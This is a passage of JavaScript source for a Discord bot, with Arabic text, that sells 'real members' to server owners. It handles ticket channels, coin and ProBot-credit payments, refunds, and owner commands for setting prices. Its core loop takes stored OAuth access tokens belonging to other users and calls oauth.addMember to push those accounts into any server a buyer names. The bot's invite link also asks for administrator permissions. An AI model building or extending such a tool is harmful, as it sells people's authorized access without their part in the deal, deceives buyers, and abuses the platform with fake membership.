        .setCustomId('payCredit')
        .setLabel('𝐂𝐫𝐞𝐝𝐢𝐭')
        .setEmoji('<:ProBot:1335208234813886515>')
        .setStyle('PRIMARY'),
      new MessageButton()
        .setCustomId('payCoins')
        .setLabel('𝐂𝐨𝐢𝐧𝐬')
.setEmoji('<:coin:1335208414275567656>')
        .setStyle('SECONDARY')
    );

    await interaction.reply({
      content: '𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐥𝐞𝐜𝐭 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝 :',
      components: [paymentRow],
      ephemeral: true,
    });
  }

  if (interaction.customId === 'payCredit') {
    // التحقق من أن الفئة (Category) موجودة
     const category = await interaction.guild.channels.cache.get(config.bot.ceatogry);
    if (!category || category.type !== 'GUILD_CATEGORY') {
      return interaction.reply({ content: 'لم يتم العثور على الفئة المحددة.', ephemeral: true });
    }

    const channelSpin = await interaction.guild.channels.create(`ticket-${interaction.user.username}`, {
      type: 'GUILD_TEXT',
      parent: config.bot.ceatogry, // الفئة المحددة
      permissionOverwrites: [
        {
          id: interaction.guild.roles.everyone.id,
          deny: ['VIEW_CHANNEL'],
        },
        {
          id: interaction.user.id,
          allow: ['VIEW_CHANNEL'],
        },
      ],
    });

    const ticketEmbed = new MessageEmbed()
      .setTitle('تــذكـرة شــراء أعــضــاء حقــيـفـية')
      .setDescription(`* **${interaction.user} مرحبا بك 👋**\n\n
  **هذه تذكرة شراء الخاصة بك سأوضح لك كيف تشتري**\n\n
  * 1. أولا يجب عليك إضافة البوت من زر \`إضافة البوت\` أسفله \n
  * 2. ثانيا اذهب إلى إعدادات حسابك في خيار \`Advance\` قم بتفعيل \`Developer Mode\` \n
  * 3. قم بنسخ إيدي سيرفرك ثم عد إلى التذكرة و اضغط زر \`شراء أعضاء\` في خانة أولى أدخل الكمية و في خانة ثانية أدخل إيدي سيرفر\n
  ثم اضغط \`Submit\`.\n
  سيقوم البوت بإرسال رسالة لكي تنسخ أمر التحويل وتقوم بالتحويل.\n
  ثم بعد ذلك سيقوم البوت بنظام تلقائي في إدخال الأعضاء إلى خادمك.\n\n
  * **⚠️ ملاحظات مهمة:**\n
  \`-\` يرجى العلم أن التحويل خارج التذكرة يعتبر خطأ ولن يتم تعويضك.\n
  \`-\` التحويل لشخص آخر خطأ منك وأنت تتحمل المسؤولية وليس لنا أي علاقة بك.\n
  \`-\` إذا قمت بالتحويل قبل أن تقوم بإضافة البوت فليس لنا علاقة بك.\n\n
عند انتهائك من الخدمة لا تنسى تقييمنا
فنحن دائمًا نقدم الأفضل 🫡`)
.setImage('https://media.discordapp.net/attachments/1328306288047947806/1328449934919208990/1736797401459.png?ex=679f22a9&is=679dd129&hm=3ffaaeda6591fe1f0f497cd384ef01d14522ad917b547fa5c98d8e3cf3b2703e&=');
    const ticketRow = new MessageActionRow().addComponents(
       new MessageButton()
          .setCustomId("buyMembers")
          .setLabel("شراء أعضاء")
          .setEmoji("👥") // استبدل الإيموجي المخصص بإيموجي Unicode
          .setStyle("SECONDARY"),
        new MessageButton()
          .setLabel("إدخال البوت")
          .setStyle("LINK")
          .setEmoji("🤖") // استبدل الإيموجي المخصص بإيموجي Unicode
          .setURL("https://discord.com/oauth2/authorize?client_id=1328416486326276176&permissions=8&integration_type=0&scope=bot"),
        new MessageButton()
          .setCustomId("closeTicket")
          .setLabel("إغلاق التذكرة")
          .setEmoji('<:warnings:1201662163815505950>') // ✅ إصلاح الإيموجي
          .setStyle("SECONDARY")
    );

    // إرسال الرسالة في القناة الجديدة
    await channelSpin.send({
      content: `* ${interaction.user}`,
      embeds: [ticketEmbed],
      components: [ticketRow],
    });

    // تأكيد إنشاء التذكرة
    await interaction.update({ content: `** تم إنشاء تذكرتك بنجاح : ${channelSpin} ✅ **`, components: [], ephemeral: true });
  }


});













client.on('interactionCreate', async (interaction) => {
    // للتعامل مع أزرار الدفع
    if (interaction.isButton()) {
        if (interaction.customId === 'payCoins') {
            try {
                const modal = new Modal()
                    .setCustomId('confirmPay')
                    .setTitle('شـراء أعضاء حقيقية');

                const countInput = new TextInputComponent()
                    .setCustomId('amount2')
                    .setLabel("الكمية")
                    .setMinLength(1)
                    .setMaxLength(5)
                    .setRequired(true)
                    .setStyle('SHORT');

                const serverIdInput = new TextInputComponent()
                    .setCustomId('serverid2')
                    .setLabel("ايدي سيرفرك")
                    .setMinLength(1)
                    .setMaxLength(22)
                    .setRequired(true)
                    .setStyle('SHORT');

                const firstActionRow = new MessageActionRow().addComponents(countInput);
                const secondActionRow = new MessageActionRow().addComponents(serverIdInput);
                modal.addComponents(firstActionRow, secondActionRow);

                await interaction.showModal(modal);
            } catch (error) {
                console.error('Error showing modal:', error);
                await interaction.reply({ content: 'حدث خطأ أثناء فتح النموذج. الرجاء المحاولة مرة أخرى.', ephemeral: true });
            }
        }
    }

    // للتعامل مع تقديم النموذج
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'confirmPay') {
            // استخدم deferReply في بداية التفاعل لمنح البوت المزيد من الوقت للمعالجة
            await interaction.deferReply({ ephemeral: true });
            
            try {
                const count = parseInt(interaction.fields.getTextInputValue('amount2')); // عدد الأعضاء
                const serverId = interaction.fields.getTextInputValue('serverid2'); // معرف السيرفر
                const pricePerMember = 1; // سعر كل عضو
                const userId = interaction.user.id; // معرف المستخدم
                const userBalance = getCoins(userId); // جلب رصيد المستخدم
                const totalCost = count * pricePerMember; // التكلفة الإجمالية
                let alld = usersdata.all();

                if (isNaN(count) || count <= 0) {
                    return interaction.editReply({ content: 'يرجى إدخال كمية صالحة.' });
                }

                if (!serverId) {
                    return interaction.editReply({ content: 'يرجى إدخال معرف السيرفر.' });
                }

                const guild = client.guilds.cache.get(serverId);
                if (!guild) {
                    return interaction.editReply({
                        content: `لم يتم العثور على السيرفر. إذا لم يتم إضافة البوت، يمكنك إضافته من هذا الرابط:\n${config.bot.inviteBotUrl}`
                    });
                }
                
                if (count > alld.length) {
                    return interaction.editReply({ content: `**هذا العدد لايوجد في المخزون ..**` });
                }

                if (userBalance < totalCost) {
                    return interaction.editReply({
                        content: `**:x:, رصيدك الحالي غير كافي : ${userBalance}
رصيد المطلوب : ${totalCost} **`
                    });
                }

                // رسالة تأكيد
                const confirmRow = new MessageActionRow().addComponents(
                    new MessageButton()
                        .setCustomId('confirmStart')
                        .setLabel('تأكيد العملية')
                        .setStyle('SUCCESS'),
                    new MessageButton()
                        .setCustomId('cancelStart')
                        .setLabel('إلغاء العملية')
                        .setStyle('DANGER')
                );

                await interaction.editReply({
                    content: `** هل أنت متأكد من إدخال : ${count} \nعلما أن سعر العضو واحد هو : ${config.bot.coinprice}**`,
                    components: [confirmRow]
                });

                // انتظر تفاعل المستخدم مع أزرار التأكيد أو الإلغاء
                const filter = (btnInteraction) =>
                    btnInteraction.user.id === userId &&
                    (btnInteraction.customId === 'confirmStart' || btnInteraction.customId === 'cancelStart');

                const collector = interaction.channel.createMessageComponentCollector({ filter, time: 60000 });

                collector.on('collect', async (btnInteraction) => {
                    if (btnInteraction.customId === 'cancelStart') {
                        await btnInteraction.update({
                            content: '❌ **تم إلغاء العملية.**',
                            components: []
                        });
                        collector.stop();
                        return;
                    }

                    if (btnInteraction.customId === 'confirmStart') {
                        // استخدم deferUpdate هنا أيضًا
                        await btnInteraction.deferUpdate();
                        
                        await btnInteraction.editReply({
                            content: '🔄 جاري إدخال الأعضاء، يرجى الانتظار...',
                            components: []
                        });
                        
                        // خصم الرصيد
                        setCoins(userId, userBalance - totalCost);

                        // متغيرات لتعقب العملية
                        let membersAdded = 0;
                        let failedCount = 0;

                        // إدخال الأعضاء
                        for (let index = 0; index < count; index++) {
                            try {
                                await oauth.addMember({
                                    guildId: guild.id,
                                    userId: alld[index].ID, // بيانات الأعضاء
                                    accessToken: alld[index].data.accessToken,
                                    botToken: client.token
                                });
                                membersAdded++;
                            } catch (err) {
                                failedCount++;
                                console.error(`فشل إدخال العضو رقم ${index + 1}: ${err}`);
                            }
                        }
     
                        await interaction.followUp({
                            content: `**✅ تمت العملية بنجاح!**\n**الأعضاء الذين تم إدخالهم:** \`${membersAdded}\`.\n**الأعضاء الذين فشلوا:** \`${failedCount}\`.\n**التكلفة الإجمالية:** \`${totalCost}\` كوين.`,
                            ephemeral: true
                        });
                        
                        // بعد طباعة الرسالة الأولى، يمكن إضافة جملة ثانية تحتها:
                        await interaction.followUp({
                            content: "**شكرا جدا انك تعاملت معانا اتمني تكتب رائيك هنا https://discord.com/channels/1142207547785359471/1360573464330637373 عشان بيهمني جدا <a:1048362753288589413:1328489627887210526> **",
                            ephemeral: true
                        });

                        // تعويض المستخدم إذا كان هناك فشل
                        if (failedCount > 0) {
                            const refundAmount = failedCount * pricePerMember;
                            setCoins(userId, getCoins(userId) + refundAmount);

                            try {
                                await interaction.user.send({
                                    content: `**تعويض عن الأعضاء الذين لم يتم إدخالهم:**\n❌ **عدد الأعضاء الفاشلين:** \`${failedCount}\`.\n💰 **تمت إضافة**: \`${refundAmount}\` عملة إلى رصيدك.`
                                });
                            } catch (err) {
                                console.error(`فشل إرسال رسالة خاصة للمستخدم: ${err}`);
                            }
                        }
                        collector.stop();
                    }
                });

                collector.on('end', async (collected) => {
                    if (collected.size === 0) {
                        try {
                            await interaction.editReply({
                                content: '⌛ **انتهى وقت التأكيد. لم يتم تنفيذ العملية.**',
                                components: []
                            });
                        } catch (error) {
                            console.error('Error editing reply after timeout:', error);
                        }
                    }
                });
            } catch (error) {
                console.error('Error processing modal submit:', error);
                await interaction.editReply({ content: 'حدث خطأ أثناء معالجة طلبك. الرجاء المحاولة مرة أخرى.' });
            }
        }
    }
});










// ================================================================
/*
client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton()) {
        if (interaction.customId === 'payCoins') {
            const modal = new Modal()
                .setCustomId('confirmPay')
                .setTitle('شـراء أعضاء حقيقية');

            const countInput = new TextInputComponent()
                .setCustomId('amount2')
                .setLabel("الكمية")
                .setMinLength(1)
                .setMaxLength(5)
                .setStyle('SHORT');

            const serverIdInput = new TextInputComponent()
                .setCustomId('serverid2')
                .setLabel("ايدي سيرفرك")
                .setMinLength(1)
                .setMaxLength(22)
                .setStyle('SHORT');

            const actionRow1 = new MessageActionRow().addComponents(countInput);
            const actionRow2 = new MessageActionRow().addComponents(serverIdInput);
            modal.addComponents(actionRow1, actionRow2);

            await interaction.showModal(modal);
        }
    }

    if (!interaction.isModalSubmit()) return;

    if (interaction.customId === 'confirmPay') {
        const count = parseInt(interaction.fields.getTextInputValue('amount2')); // عدد الأعضاء
        const serverId = interaction.fields.getTextInputValue('serverid2'); // معرف السيرفر
        const pricePerMember = 1; // سعر كل عضو
        const userId = interaction.user.id; // معرف المستخدم
        const userBalance = getCoins(userId); // جلب رصيد المستخدم
        const totalCost = count * pricePerMember; // التكلفة الإجمالية
        let alld = usersdata.all();

        if (isNaN(count) || count <= 0) {
            return interaction.reply({ content: 'يرجى إدخال كمية صالحة.', ephemeral: true });
        }

        if (!serverId) {
            return interaction.reply({ content: 'يرجى إدخال معرف السيرفر.', ephemeral: true });
        }

        const guild = client.guilds.cache.get(serverId);
        if (!guild) {
            return interaction.reply({
                content: `لم يتم العثور على السيرفر. إذا لم يتم إضافة البوت، يمكنك إضافته من هذا الرابط:\n${config.bot.inviteBotUrl}`,
                ephemeral: true
            });
        }
        if (count > alld.length) {
            return interaction.reply({ content: `**هذا العدد لايوجد في المخزون ..**`, ephemeral: true });
        }

        if (userBalance < totalCost) {
            return interaction.reply({
                content: `**:x:, رصيدك الحالي غير كافي : ${userBalance}
رصيد المطلوب : ${totalCost} **`,
                ephemeral: true
            });
        }

        // رسالة تأكيد
        const confirmRow = new MessageActionRow().addComponents(
            new MessageButton()
                .setCustomId('confirmStart')
                .setLabel('تأكيد العملية')
                .setStyle('SUCCESS'),
            new MessageButton()
                .setCustomId('cancelStart')
                .setLabel('إلغاء العملية')
                .setStyle('DANGER')
        );

        await interaction.reply({
            content: `** هل أنت متأكد من إدخال : ${count} \nعلما أن سعر العضو واحد هو : ${config.bot.coinprice}**`,
            components: [confirmRow],
            ephemeral: true
        });

        // انتظر تفاعل المستخدم مع أزرار التأكيد أو الإلغاء
        const filter = (btnInteraction) =>
            btnInteraction.user.id === userId &&
            (btnInteraction.customId === 'confirmStart' || btnInteraction.customId === 'cancelStart');

        const collector = interaction.channel.createMessageComponentCollector({ filter, time: 60000 });

        collector.on('collect', async (btnInteraction) => {
            if (btnInteraction.customId === 'cancelStart') {
                await btnInteraction.update({
                    content: '❌ **تم إلغاء العملية.**',
                    components: []
                });
                collector.stop();
                return;
            }

            if (btnInteraction.customId === 'confirmStart') {
const message = await btnInteraction.update({
                    content: '🔄 جاري إدخال الأعضاء، يرجى الانتظار...',
                    components: []
                });
                // خصم الرصيد
                setCoins(userId, userBalance - totalCost);

                // متغيرات لتعقب العملية
                let membersAdded = 0;
                let failedCount = 0;

                // تحديث الرسالة إلى "جاري إدخال الأعضاء"
                

                // إدخال الأعضاء
                for (let index = 0; index < count; index++) {
                    try {
                        await oauth.addMember({
                            guildId: guild.id,
                            userId: alld[index].ID, // بيانات الأعضاء
                            accessToken: alld[index].data.accessToken,
                            botToken: client.token
                        });
                        membersAdded++;
                    } catch (err) {
                        failedCount++;
                        console.error(`فشل إدخال العضو رقم ${index + 1}: ${err}`);
                    }
                }
 
                 await interaction.followUp({
                    content: `**✅ تمت العملية بنجاح!**\n**الأعضاء الذين تم إدخالهم:** \`${membersAdded}\`.\n**الأعضاء الذين فشلوا:** \`${failedCount}\`.\n**التكلفة الإجمالية:** \`${totalCost}\` كوين.`,

                ephemeral: true
                });
// بعد طباعة الرسالة الأولى، يمكن إضافة جملة ثانية تحتها:
await interaction.followUp({
    content: "**شكرا جدا انك تعاملت معانا اتمني تكتب رائيك هنا https://discord.com/channels/1142207547785359471/1328822824046952518 عشان بيهمني جدا <a:1048362753288589413:1328489627887210526> **",
    ephemeral: true
});

                // تعويض المستخدم إذا كان هناك فشل
                if (failedCount > 0) {
                    const refundAmount = failedCount * pricePerMember;
                    setCoins(userId, getCoins(userId) + refundAmount);

                    try {
                        await interaction.user.send({
                            content: `**تعويض عن الأعضاء الذين لم يتم إدخالهم:**\n❌ **عدد الأعضاء الفاشلين:** \`${failedCount}\`.\n💰 **تمت إضافة**: \`${refundAmount}\` عملة إلى رصيدك.`
                        });
                    } catch (err) {
                        console.error(`فشل إرسال رسالة خاصة للمستخدم: ${err}`);
                    }
                }
                        collector.stop();
            }
        });

        collector.on('end', async (collected) => {
            if (collected.size === 0) {
                await interaction.editReply({
                    content: '⌛ **انتهى وقت التأكيد. لم يتم تنفيذ العملية.**',
                    components: []
                });
            }
        });
    }
});
*/

/*


// ================================================================
client.on(`interactionCreate`,async interaction => {
  if (!interaction.isButton())return ; 
  if (interaction.customId == 'buyMembers'){

    const BuyModal = new Modal()
    .setCustomId('BuyModal')
    .setTitle('شراء اعضاء');
  const Count = new TextInputComponent()
    .setCustomId('Count')
    .setLabel("الكمية")
    .setMinLength(1)
    .setMaxLength(5)
    .setStyle('SHORT'); 
    
    const serverid = new TextInputComponent()
    .setCustomId('serverid')
    .setLabel("ايدي سيرفرك")
    .setMinLength(1)
    .setMaxLength(22)
    .setStyle('SHORT'); 


  const firstActionRow = new MessageActionRow().addComponents(Count);
  const firstActionRow2 = new MessageActionRow().addComponents(serverid);


  BuyModal.addComponents(firstActionRow , firstActionRow2);

  await interaction.showModal(BuyModal);


  } else if (interaction.customId === 'closeTicket') {
      const confirmRow = new MessageActionRow().addComponents(
        new MessageButton()
          .setCustomId('confirmDelete')
          .setLabel('تأكيد')
          .setStyle('SECONDARY'),
        new MessageButton()
          .setCustomId('cancelDelete')
          .setLabel('إلغاء')
          .setStyle('DANGER'),
      );

      await interaction.reply({
        content: 'هل أنت متأكد من إغلاق التذكرة؟',
        components: [confirmRow],
        ephemeral: true,
      });

    } else if (interaction.customId === 'confirmDelete') {
      await interaction.update({ content: '**سيتم حذف التذكرة بعد 5 ثواني...**', components: [] });

      setTimeout(async () => {
        const channel = interaction.channel;
        if (channel) await channel.delete();
      }, 5000);

    } else if (interaction.customId === 'cancelDelete') {
      await interaction.update({ content: '** تم إلغاء حذف التذكرة بنجاح **', components: [] });
    }
})



client.on(`interactionCreate`, async interaction => {
  if (!interaction.isModalSubmit()) return;

  if (interaction.customId == 'BuyModal') {
    const Count = interaction.fields.getTextInputValue('Count');
    const serverid = interaction.fields.getTextInputValue('serverid');
    const price = config.bot.price;

    const result = Count * price;
    const tax = Math.floor(result * (20 / 19) + 1);

    let alld = usersdata.all();
    let guild = client.guilds.cache.get(`${serverid}`);
    let amount = Count;
    let count = 0;

    if (!guild) {
      return interaction.reply({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` });
    }

    if (amount > alld.length) {
      return interaction.reply({ content: `**لا يمكنك ادخال هذا العدد ..**` });
    }

    await interaction.reply({ content: `#credit ${config.bot.TraId} ${tax}` });

    const filter = ({ content, author: { id } }) => {
      return (
        content.startsWith(`**:moneybag: | ${interaction.user.username}, has transferred `) &&
        content.includes(config.bot.TraId) &&
        id === "282859044593598464" &&
        (Number(content.slice(content.lastIndexOf("`") - String(tax).length, content.lastIndexOf("`"))) >= result)
      );
    };

    const collector = interaction.channel.createMessageCollector({
      filter,
      max: 1,
    });

    collector.on('collect', async collected => {
      console.log(`Collected message: ${collected.content}`);
      await interaction.deleteReply();

      let msg = await interaction.channel.send({ content: `**جاري الفحص ..**` });

      for (let index = 0; index < amount; index++) {
        await oauth.addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token
        }).then(() => {
          count++;
        }).catch(err => {
          console.error(`Error adding member: ${err}`);
        });
      }

      msg.edit({
        content: `**تم بنجاح ..**
  **✅  تم ادخال** \`${count}\`
  **❌ لم اتمكن من ادخال** \`${amount - count}\`
  **📡 تم طلب** \`${amount}\``
});
await interaction.followUp({
    content: "**شكرا جدا انك تعاملت معانا اتمني تكتب رائيك هنا https://discord.com/channels/1142207547785359471/1328822824046952518 عشان بيهمني جدا <a:1048362753288589413:1328489627887210526> **",
    
});
        
      // إرسال رسالة إلى القناة المحددة
      const channelId = config.bot.channelId; 
      const logChannel = client.channels.cache.get(channelId);

      const embed = new MessageEmbed()
        .setTitle('تم شراء أعضاء')
        .setDescription(`**العميل:** ${interaction.user}\n**عدد الأعضاء:** ${amount}`)
        .setColor(config.bot.colorembed)
        .setTimestamp();

      if (logChannel) {
        logChannel.send({ embeds: [embed] });
        logChannel.send({content:`${config.bot.LineIce}`})
      } else {
        console.log(`القناة بمعرف ${channelId} غير موجودة.`);
      }

      // إعطاء العميل رتبة معينة
      const roleId = config.bot.roleId; 
      const member = await guild.members.fetch(interaction.user.id).catch(err => {
        console.log(`لم أتمكن من إيجاد العضو ${interaction.user.id}: ${err}`);
      });

      if (member) {
        member.roles.add(roleId).catch(console.error);
      }
    });

    // معالجة أي أخطاء في المجمّع
    collector.on('end', collected => {
      if (collected.size === 0) {
        console.log("لم يتم جمع أي رسائل.");
      }
    });
  }
}); */




client.on('interactionCreate', async interaction => {
  try {
    if (interaction.isButton()) {
      if (interaction.customId === 'buyMembers') {
        const BuyModal = new Modal()
          .setCustomId('BuyModal')
          .setTitle('شراء اعضاء');

        const Count = new TextInputComponent()
          .setCustomId('Count')
          .setLabel("الكمية")
          .setPlaceholder("أدخل عدد الأعضاء المطلوبين")
          .setMinLength(1)
          .setMaxLength(5)
          .setStyle('SHORT')
          .setRequired(true);

        const serverid = new TextInputComponent()
          .setCustomId('serverid')
          .setLabel("ايدي سيرفرك")
          .setPlaceholder("أدخل معرف السيرفر الخاص بك")
          .setMinLength(18)
          .setMaxLength(22)
          .setStyle('SHORT')
          .setRequired(true);

        const firstActionRow = new MessageActionRow().addComponents(Count);
        const secondActionRow = new MessageActionRow().addComponents(serverid);

        BuyModal.addComponents(firstActionRow, secondActionRow);
        await interaction.showModal(BuyModal);
      }
      else if (interaction.customId === 'closeTicket') {
        // كود إغلاق التذكرة
        const confirmRow = new MessageActionRow().addComponents(
          new MessageButton()
            .setCustomId('confirmDelete')
            .setLabel('تأكيد')
            .setStyle('DANGER'),
          new MessageButton()
            .setCustomId('cancelDelete')
            .setLabel('إلغاء')
            .setStyle('SECONDARY'),
        );

        await interaction.reply({
          content: 'هل أنت متأكد من إغلاق التذكرة؟',
          components: [confirmRow],
          ephemeral: true,
        });
      } 
      else if (interaction.customId === 'confirmDelete') {
        await interaction.update({ 
          content: '**سيتم حذف التذكرة بعد 5 ثواني...**', 
          components: [] 
        });

        setTimeout(async () => {
          try {
            await interaction.channel?.delete();
          } catch (error) {
            console.error('Error deleting ticket:', error);
          }
        }, 5000);
      } 
      else if (interaction.customId === 'cancelDelete') {
        await interaction.update({ 
          content: '**تم إلغاء حذف التذكرة بنجاح**', 
          components: [] 
        });
      }
      // ... باقي معالجات الأزرار
    } 
    else if (interaction.isModalSubmit()) {
      if (interaction.customId === 'BuyModal') {
        await interaction.deferReply({ ephemeral: true });

        const Count = interaction.fields.getTextInputValue('Count');
        const serverid = interaction.fields.getTextInputValue('serverid');
        const price = config.bot.price;

        const result = Count * price;
        const tax = Math.floor(result * (20 / 19) + 1);

        let alld = usersdata.all();
        let guild = client.guilds.cache.get(serverid);
        let amount = parseInt(Count);
        let count = 0;

        if (!guild) {
          return interaction.followUp({ content: `**عذرًا، لم اتمكن من العثور على الخادم..**` });
        }

        if (amount > alld.length) {
          return interaction.followUp({ content: `**لا يمكنك ادخال هذا العدد..**` });
        }

        await interaction.followUp({ content: `#credit ${config.bot.TraId} ${tax}` });

        const filter = ({ content, author: { id } }) => {
          return (
            content.startsWith(`**:moneybag: | ${interaction.user.username}, has transferred `) &&
            content.includes(config.bot.TraId) &&
            id === "282859044593598464" &&
            (Number(content.slice(content.lastIndexOf("`") - String(tax).length, content.lastIndexOf("`"))) >= result)
          );
        };

        const collector = interaction.channel.createMessageCollector({
          filter,
          max: 1,
          time: 60000 // إضافة وقت 60 ثانية كحد أقصى
        });

        collector.on('collect', async collected => {
          console.log(`Collected message: ${collected.content}`);

       const msg = await interaction.channel.send({ content: '**جاري إضافة الأعضاء...**' });
                  let count = 0;

                  for (let index = 0; index < amount; index++) {
                      try {
                          await oauth.addMember({
                              guildId: guild.id,
                              userId: alld[index].ID,
                              accessToken: alld[index].data.accessToken,
                              botToken: client.token
                          });
                          count++;
                      } catch (err) {
                          console.error(`Error adding member: ${err}`);
                      }
                  }

                  await msg.edit({
                      content: `**تمت العملية بنجاح**\n` +
                               `✅ **تم إدخال:** \`${count}\`\n` +
                               `❌ **فشل إدخال:** \`${amount - count}\`\n` +
                               `📡 **الكمية المطلوبة:** \`${amount}\``
                  });


          await interaction.followUp({
            content: "**شكرا جدا انك تعاملت معانا اتمني تكتب رائيك هنا https://discord.com/channels/1142207547785359471/1360573464330637373 عشان بيهمني جدا <a:1048362753288589413:1328489627887210526> **"
          });

          // إرسال رسالة إلى القناة المحددة
          const channelId = config.bot.channelId; 
          const logChannel = client.channels.cache.get(channelId);

          const embed = new MessageEmbed()
            .setTitle('تم شراء أعضاء')
            .setDescription(`**العميل:** ${interaction.user}\n**عدد الأعضاء:** ${amount}`)
            .setColor(config.bot.colorembed)
            .setTimestamp();

          if (logChannel) {
            logChannel.send({ embeds: [embed] });
            logChannel.send({ content: `${config.bot.LineIce}` });
          } else {
            console.log(`القناة بمعرف ${channelId} غير موجودة.`);
          }

          // إعطاء العميل رتبة معينة
          try {
            const roleId = config.bot.roleId;
            const memberServer = await guild.members.fetch(interaction.user.id);
            if (memberServer) {
              await memberServer.roles.add(roleId);
            }
          } catch (err) {
            console.error(`لم أتمكن من إضافة الرتبة للعضو ${interaction.user.id}: ${err}`);
          }
        });

        collector.on('end', collected => {
          if (collected.size === 0) {
            interaction.followUp({ content: "**انتهت مهلة الدفع، يرجى المحاولة مرة أخرى.**" });
          }
        });
      }
    }
  } catch (error) {
    console.error('Error in interactionCreate handler:', error);
    try {
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: "**حدث خطأ أثناء معالجة طلبك، يرجى المحاولة مرة أخرى.**", ephemeral: true });
      } else {
        await interaction.followUp({ content: "**حدث خطأ أثناء معالجة طلبك، يرجى المحاولة مرة أخرى.**", ephemeral: true });
      }
    } catch (replyError) {
      console.error('Error replying to interaction after error:', replyError);
    }
  }
});








client.on('messageCreate', async (message) => {
  if (message.author.bot || !config.bot.taxchannels.includes(message.channelId)) return;

  // التحقق مما إذا كانت الرسالة تحتوي على رقم بصيغة 1k, 1m, 1b, 1B, 1M, 1K
  const regex = /^(\d+)([kKmMbB])?$/;
  const match = message.content.match(regex);

  if (!match) return;

  let number = parseInt(match[1]);
  const suffix = match[2] ? match[2].toLowerCase() : '';

  // تحويل القيم بناءً على اللاحقة
  switch (suffix) {
    case 'k':
      number *= 1000;
      break;
    case 'm':
      number *= 1000000;
      break;
    case 'b':
      number *= 1000000000;
      break;
  }

  try {
    const tax = parseInt(number / 0.95 + 1);
    const tax2 = parseInt(tax / 0.95 + 1);
    const rate = parseInt(number * 0.02);

    const embed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true })) // صورة العضو
      .setDescription(`
        ** 
        > المبلغ كامل : \`${number}\`
        >  المبلغ مع ضريبة بروبوت : \`${tax}\`
        >  المبلغ كامل مع ضريبة الوسيط : \`${tax2}\`
        >  نسبة الوسيط 2% : \`${rate}\`
        >  المبلغ كامل مع ضريبة بروبوت و الوسيط : \`${tax2 + rate}\`
        **`)
      .setFooter({ text: message.author.username, iconURL: message.author.displayAvatarURL({ dynamic: true }) }) // اسم العضو وصورته
      .setTimestamp();

    // إرسال الرسالة بالـ embed
    await message.channel.send({ embeds: [embed] });
    await message.channel.send({content:`${config.bot.LineIce}`})

    // مسح الرسالة الأصلية
    await message.delete();

  } catch (error) {
    console.error(error);
  }
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  // التحقق من أن الرسالة تبدأ بالأمر ${prefix}tax
  if (message.content.startsWith(`${prefix}tax`)) {
    // فصل الأمر عن الرقم
    const args = message.content.split(' ').slice(1).join(' '); // استخراج الرقم بعد ${prefix}tax

    // التحقق من أن المستخدم أدخل رقمًا
    const regex = /^(\d+)([kKmMbB])?$/;
    const match = args.match(regex);

    if (!match) {
      return message.reply('الرجاء إدخال رقم صالح مثل 1K أو 1M أو 1B ❗');
    }

    let number = parseInt(match[1]);
    const suffix = match[2] ? match[2].toLowerCase() : '';

    // تحويل القيم بناءً على اللاحقة
    switch (suffix) {
      case 'k':
        number *= 1000;
        break;
      case 'm':
        number *= 1000000;
        break;
      case 'b':
        number *= 1000000000;
        break;
    }

    try {
      const tax = parseInt(number / 0.95 + 1);
      const tax2 = parseInt(tax / 0.95 + 1);
      const rate = parseInt(number * 0.02);

      const embed = new MessageEmbed()
        .setColor(config.bot.colorembed)
        .setThumbnail(message.author.displayAvatarURL({ dynamic: true })) // صورة العضو
        .setDescription(`
          ** 
          > المبلغ كامل : \`${number}\`
          >  المبلغ مع ضريبة بروبوت : \`${tax}\`
          >  المبلغ كامل مع ضريبة الوسيط : \`${tax2}\`
          >  نسبة الوسيط 2% : \`${rate}\`
          >  المبلغ كامل مع ضريبة بروبوت و الوسيط : \`${tax2 + rate}\`
          **`)
        .setFooter({ text: message.author.username, iconURL: message.author.displayAvatarURL({ dynamic: true }) }) // اسم العضو وصورته
        .setTimestamp();

      // إرسال الرسالة بالـ embed
      await message.channel.send({ embeds: [embed] });

      // مسح الرسالة الأصلية

    } catch (error) {
      console.error(error);
    }
  }
});



client.on('messageCreate', async message => {
    // تحقق من أن الرسالة ليست من بوت
    if (message.author.bot) return;

    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    // تحقق من محتوى الرسالة
    if (message.content.toLowerCase() === 'خط') {
        // حذف الرسالة الأصلية
        await message.delete();

        // الرد برسالة جديدة
        await message.channel.send(config.bot.LineIce);
    }
});



const { joinVoiceChannel } = require('@discordjs/voice');
client.on('ready', () => {

  setInterval(async () => {
    client.channels.fetch(config.bot.VoiceChannelId)
      .then((channel) => {
        const VoiceConnection = joinVoiceChannel({
          channelId: channel.id,
          guildId: channel.guild.id,
          adapterCreator: channel.guild.voiceAdapterCreator
        });
      }).catch((error) => { return; });
  }, 1000)
});




client.on('messageCreate', async (message) => {
  if (message.content.startsWith(`${config.bot.prefix}price`)) {
    if (!config.bot.owners.includes(message.author.id)) {
      message.reply('لا تملك الصلاحيات لتنفيذ هذا الأمر.');
      return;
    }
    const args = message.content.split(' ');
    if (args.length !== 2) {
      message.reply('قم بوضع سعر الآعضاء صحيح');
      return;
    }
    config.bot.price = args[1];
    fs.writeFileSync('./config.js', `module.exports = ${JSON.stringify(config, null, 2)};`, 'utf-8');

    message.reply(`اصبح سعر الآعضاء **${args[1]}**`);
  }
});

client.on('messageCreate', async (message) => {
  if (message.content.startsWith(`${config.bot.prefix}coinprice`)) {
    if (!config.bot.owners.includes(message.author.id)) {
      message.reply('لا تملك الصلاحيات لتنفيذ هذا الأمر.');
      return;
    }
    const args = message.content.split(' ');
    if (args.length !== 2) {
      message.reply('قم بوضع سعر الكوينز صحيح');
      return;
    }
    config.bot.coinprice = args[1];
    fs.writeFileSync('./config.js', `module.exports = ${JSON.stringify(config, null, 2)};`, 'utf-8');

    message.reply(`اصبح سعر الكوينز **${args[1]}**`);
  }
});




//verify role



const CLIENT_ID = '1328416486326276176';
const CLIENT_SECRET = process.env.clientSECRET;
